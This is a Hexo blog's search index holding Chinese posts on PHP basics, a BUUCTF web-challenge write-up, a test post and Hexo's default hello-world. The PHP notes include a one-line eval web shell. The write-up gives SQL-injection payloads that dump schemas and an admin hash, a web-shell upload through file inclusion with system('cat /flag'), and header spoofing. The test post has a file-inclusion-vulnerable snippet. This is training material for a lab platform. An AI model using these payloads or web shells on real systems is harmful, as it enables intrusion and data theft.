<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP 基础(部分)</title>
    <link href="/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/"/>
    <url>/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h1><p>如 <code>__FILE__</code> 这样的预定义常量，被称为魔术常量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 返回文件完整的路径和文件名</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//代码高亮显示当前文件内容</span><br><span class="hljs-keyword">__LINE__</span><span class="hljs-comment">// 表示当前行号</span><br><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 表示当前文件名</span><br><span class="hljs-keyword">__DIR__</span><span class="hljs-comment">// 表示当前文件所在的目录</span><br><span class="hljs-keyword">__FUNCTION__</span><span class="hljs-comment">// 表示当前函数名</span><br><span class="hljs-keyword">__CLASS__</span><span class="hljs-comment">// 表示当前类名</span><br><span class="hljs-keyword">__METHOD__</span><span class="hljs-comment">// 表示当前方法名</span><br><span class="hljs-keyword">__NAMESPACE__</span><span class="hljs-comment">// 表示当前命名空间</span><br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">include</span>(): 包含并运行指定文件，包含文件发生错误，程序警告，但会继续执行<br><span class="hljs-built_in">include_once</span>(): 检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次<br><span class="hljs-built_in">require</span>(): 包含并运行指定的文件，包含文件发生错误时，程序直接终止执行<br><span class="hljs-built_in">require_once</span>():和 require 类似，不同处在于 require_once 只导入一次<br><span class="hljs-built_in">fopen</span>(): 打开一个文件或 URL<br><span class="hljs-built_in">file_get_contents</span>(): 读取文件的全部内容到一个字符串，例如 <span class="hljs-variable">$content</span> = <span class="hljs-built_in">file_get_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-built_in">file_put_contents</span>(): 将一个字符串写入文件。例如：<span class="hljs-built_in">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>(): 将字符串当中php代码来执行，比如: 一句话木马@<span class="hljs-built_in">eval</span>(_POST[<span class="hljs-string">&quot;1&quot;</span>]);<br><span class="hljs-built_in">assert</span>(): 检测执行条件是否为 true<br></code></pre></td></tr></table></figure><p>调用系统底层的4个方法-system , shell_exec , exec , passthru</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">system</span>(): 调用系统底层，执行系统命令，例如 <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>); 列出当前目录下所有文件<br><span class="hljs-built_in">shell_exc</span>(): 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回<br><span class="hljs-built_in">exec</span>():执行一个外部程序<br><span class="hljs-built_in">passthru</span>():执行外部程序并且显示原始输出，当所执行的 Unix<br>命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <span class="hljs-built_in">exec</span>() 或 <span class="hljs-built_in">system</span>() 函数<br></code></pre></td></tr></table></figure><h2 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">unserialize</span>(): 将一个已序列化的字符串转换回 PHP 的值。例如：<span class="hljs-variable">$array</span> = <span class="hljs-built_in">unserialize</span>(<span class="hljs-variable">$serializedStr</span>); 可以将一个序列化的数组字符串转换为数组。<br></code></pre></td></tr></table></figure><h2 id="数据库操作函数"><a href="#数据库操作函数" class="headerlink" title="数据库操作函数"></a>数据库操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysql_query</span>(), <span class="hljs-built_in">mysqli_query</span>(): 发送一个 MySQL 查询。例如：<span class="hljs-variable">$result</span> = <span class="hljs-built_in">mysql_query</span>(<span class="hljs-string">&quot;SELECT * FROM users&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a>正则表达式函数</h2><p><strong>preg_match():</strong></p><p>用于进行正则表达式匹配，成功返回 1，否则返回 0。</p><p>注: <code>preg_match() </code>第一次匹配成功后就会停止匹配，如果要实现全部结果的匹配，即搜索到检索对象的结尾处，则需使用 <code>preg_match_all()</code> 函数。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>, <span class="hljs-variable">$matches</span>))<br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was found:&quot;</span>. <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]; <br>   &#125; <br>   <span class="hljs-keyword">else</span><br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was not found.&quot;</span>; <br>   &#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//A match was found: PHP </span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all():</strong> </p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php">   <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;&lt;pre&gt;学习php是一件快乐的事。&lt;/pre&gt;&lt;pre&gt;所有的 phper 需要共同努力！&lt;/pre&gt;&quot;</span>; </span><br><span class="language-php">   <span class="hljs-variable">$kw</span> = <span class="hljs-string">&quot;php&quot;</span>; <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/&lt;pre&gt;([sS]*?)&lt;/pre&gt;/&#x27;</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$mat</span>); </span><br><span class="language-php">   <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>]);<span class="hljs-variable">$i</span>++)</span><br><span class="language-php">   &#123;</span><br><span class="language-php">      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>]; </span><br><span class="language-php">      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$kw</span>, <span class="hljs-string">&#x27;&lt;span style=&quot;color:#ff0000&quot;&gt;&#x27;</span>.<span class="hljs-variable">$kw</span>.<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>, <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>]); </span><br><span class="language-php">      <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$str</span>); </span><br><span class="language-php">   &#125; </span><br><span class="language-php">   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>; </span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">//将所有 <span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span> 标签内的关键字显示为红色</span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all()</strong></p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><p><strong>preg_replace()</strong></p><p> 执行正则表达式搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;butt3rf1y&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/\d+/&#x27;</span>;<span class="hljs-comment">// \d+是匹配一个或多个数字</span><br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;R&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// buttRrfRy</span><br></code></pre></td></tr></table></figure><p><strong>preg_split()</strong></p><p>将字符串依指定的规则切开。</p><h1 id="表单数据"><a href="#表单数据" class="headerlink" title="表单数据"></a>表单数据</h1><p><strong>$_GET</strong></p><p>接受 GET 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">example.com/index.php?<span class="hljs-attribute">bu</span>=butt3rf1y，你可以使用 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值<br></code></pre></td></tr></table></figure><p><strong>$_POST</strong></p><p>接受 POST 传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">example.com/index.php 进行 POST 传参，参数名为 bu 内容为 but3rf1y，可以使用 <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值。<br></code></pre></td></tr></table></figure><p><strong>$_REQUEST</strong></p><p>接受 GET 和 POST 以及 Cookie 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">通过 <span class="hljs-built_in">GET</span> 请求 URL 传递了一个参数 example.com/index.php?<span class="hljs-attribute">key</span>=value_from_get，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>通过 POST 方法提交了一个表单，其中有一个名为 key 的字段且其值为 value_from_post，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>设置了一个名为 key 的 cookie，其值为 value_from_cookie,可以使用 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 来获取这个值。<br></code></pre></td></tr></table></figure><p>有点小累……</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU Basic(1)</title>
    <link href="/2024/11/07/BUUBasic-1/"/>
    <url>/2024/11/07/BUUBasic-1/</url>
    
    <content type="html"><![CDATA[<h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>                                                                                                                                                                                                                                                                                                                                                                          <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p><img src="/2024/11/06/TestWP/c-1/SQL1.png"></p><p>点击 <code>测试新闻1</code> ，f12 查看状态，发现注入点，访问请求网址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 正常回显<br><span class="hljs-attribute">1</span>=2 报错，说明有注入点<br></code></pre></td></tr></table></figure><p>构造 payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">2</span>#<br>得到数据库：information_schema,performance_schema,ctftraining,mysql,test,news<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;news&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 news 下的表：<span class="hljs-keyword">admin</span>,contents<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 ctftraining 下的表：FLAG_TABLE,news,users<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 表下的列名：id,username,<span class="hljs-keyword">password</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 users 表下的列名：<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,<span class="hljs-keyword">password</span>,ip,<span class="hljs-type">time</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(username,&quot; &quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 的数据：username=<span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span>=<span class="hljs-number">64</span>ebd6a0d676acff2c6bed36e716c9aa<br></code></pre></td></tr></table></figure><h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>文件上传，先上传一个一句话木马 11.php ，但是蚁剑连接不了，无论上传什么都会被解析成 <code>.jpg</code> 格式</p><p>后面才知道这有一个文件包含漏洞，文件上传和文件包含结合起来了。</p><p><code>http://4eb012d0-f5b1-4297-907d-54f47dfaddf1.node5.buuoj.cn:81/index.php?file=upload.php</code> 将 <code>upload.php</code> 换成上传的文件的路径，然后对其 post 传参 </p><p>payload：1 是一句话木马的连接密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h2><p>提示只能本地访问，所以bp 抓包进行 <code>X-Forwarded-For</code> 伪造</p><p>然后进行 post 传参</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=admin&amp;password=wwoj2wio2jw93ey43eiuwdjnewkndjlwe<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TestWP</title>
    <link href="/2024/11/06/TestWP/"/>
    <url>/2024/11/06/TestWP/</url>
    
    <content type="html"><![CDATA[<p>这是一篇测试文章</p><p><img src="/2024/11/06/TestWP/111.png"></p><h1 id="一剪梅·红藕香残玉簟秋"><a href="#一剪梅·红藕香残玉簟秋" class="headerlink" title="一剪梅·红藕香残玉簟秋"></a>一剪梅·红藕香残玉簟秋</h1><p>一剪梅·红藕香残玉簟秋</p><p>李清照</p><p>红藕香残玉簟秋。轻解罗裳，独上兰舟。云中谁寄锦书来？雁字回时，月满西楼。<br>花自飘零水自流。一种相思，两处闲愁。此情无计可消除，才下眉头，却上心头。</p><p>C&#x2F;C++</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;e3nifIH9b_C@n@dH&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i])-i)<br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>Java</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Main &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;<br>        Node java= <span class="hljs-built_in">new</span> Node(&quot;java&quot;);<br>        Node rw=<span class="hljs-built_in">new</span> Node(&quot;rw&quot;);<br>        Node urm=<span class="hljs-built_in">new</span> Node(&quot;urm&quot;);<br>        java.next=rw;<br>        rw.next=urm;<br>        <br>        urm.prev=rw;<br>        rw.prev=java;<br>        <br>        Node first=java;<br>        Node last=urm;<br>        <br>        Node <span class="hljs-keyword">temp</span>=first;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">temp</span>!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">temp</span>);<br>            <span class="hljs-keyword">temp</span>=<span class="hljs-keyword">temp</span>.next;<br>        &#125;<br>        <br>        <span class="hljs-keyword">temp</span>=last;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">temp</span>!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">temp</span>);<br>            <span class="hljs-keyword">temp</span>=<span class="hljs-keyword">temp</span>.prev;<br>        &#125;<br>        <br>    &#125;<br>    <br>&#125;<br><span class="hljs-keyword">class</span> Node&#123;<br>    <span class="hljs-built_in">public</span> Node prev;<br>    <span class="hljs-built_in">public</span> Node next;<br>    <span class="hljs-built_in">public</span> <span class="hljs-keyword">Object</span> item;<br>    <br>    <span class="hljs-built_in">public</span> Node(<span class="hljs-keyword">Object</span> item) &#123;<br>        this.item = item;<br>    &#125;<br>    <br>    @Override<br>    <span class="hljs-built_in">public</span> String toString() &#123;<br>        <span class="hljs-keyword">return</span> &quot;Node&#123;&quot; + &quot;item=&quot; + item + <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>表格</p><table><thead><tr><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>4</td><td>5</td><td>6</td></tr><tr><td>7</td><td>8</td><td>9</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/06/hello-world/"/>
    <url>/2024/11/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
